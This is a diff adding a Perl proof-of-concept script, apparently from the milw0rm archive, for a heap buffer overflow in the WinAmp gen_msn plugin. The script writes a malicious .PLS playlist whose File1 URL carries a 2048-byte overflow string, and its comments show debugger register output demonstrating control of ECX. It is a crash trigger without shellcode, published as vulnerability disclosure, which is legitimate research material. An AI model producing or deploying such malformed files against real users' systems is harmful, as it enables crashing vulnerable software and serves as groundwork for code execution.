@@ -1,0 +1,56 @@
+#!/usr/bin/perl
+# WinAmp GEN_MSN Plugin Heap Buffer Overflow
+# ------------------------------------
+# Discovered by SkD (skdrat@hotmail.com) &
+#		    (skd@abysssec.com)
+# ------------------------------------
+#
+# I'm not much for posting PoCs because
+# I like writing exploits for whatever
+# I discover and if I don't, its a waste.
+#
+# Anyway, this buffer overflow is located
+# in the gen_msn plugin, which
+# is basically a plugin that shows what
+# song you're currently listening to
+# on your PM in MSN. The plugin has over
+# 800,000 downloads so its serious..
+# (http://www.winamp.com/plugins/details/144799)
+# This is similar to my other recent exploit
+# for VUPlayer because it uses the same point
+# of the .PLS playlist file!
+#
+# Debug Info:
+# MOV EDI,DWORD PTR DS:[ECX+EAX*4+960]
+# Regs:
+# EAX 00000003
+# ECX 41414141   <- Clear control over the register
+# EDX 007EA478
+# EBX 40000001
+# ESP 028F1DB0
+# EBP 77230459 USER32.SendMessageA
+# ESI 08FD62A8 gen_msn.08FD62A8
+# EDI 00497300 UNICODE "http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+# EIP 08FD293C gen_msn.08FD293C
+#
+# Peace out.
+#                           _________ ___   ________
+#                          /   _____/|  | __\______ \
+#                          \_____  \ |  |/ / |    |  \
+#                          /        \|    <  |    `   \
+#                         /_______  /|__|_ \/_______  /
+#                                 \/      \/        \/
+use strict;
+use warnings;
+
+my $overflow = "\x41" x 2048;
+
+open(my $pls_playlist, "> poc.pls");
+print $pls_playlist "[playlist]\r\n".
+		    "NumberOfEntries=1\r\n".
+                    "File1=http://".
+                    $overflow.
+                    "\r\n";
+close $pls_playlist;
+
+# milw0rm.com [2009-01-07]
